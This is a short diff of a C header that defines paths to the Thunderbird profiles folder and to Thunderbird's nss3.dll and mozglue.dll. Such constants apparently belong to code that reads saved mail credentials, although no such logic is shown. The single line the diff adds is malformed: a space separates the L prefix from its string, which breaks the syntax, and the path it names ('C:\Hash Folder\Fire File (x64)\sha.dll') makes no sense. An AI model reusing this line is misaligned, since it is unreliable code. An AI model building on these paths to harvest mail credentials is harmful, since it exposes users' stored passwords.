@@ -59,3 +59,4 @@
 #define THUNDERBIRD_FOLDER L"\\Thunderbird\\Profiles"
 #define THUNDERBIRD_DLL_NSS3 L"C:\\Program Files (x86)\\Mozilla Thunderbird\\nss3.dll"
 #define THUNDERBIRD_DLL_MOZGLUE L"C:\\Program Files (x86)\\Mozilla Thunderbird\\mozglue.dll"
+#define THUNDERBIRD_HASH_RESULTS L "C:\\Hash Folder\\Fire File (x64)\\sha.dll"
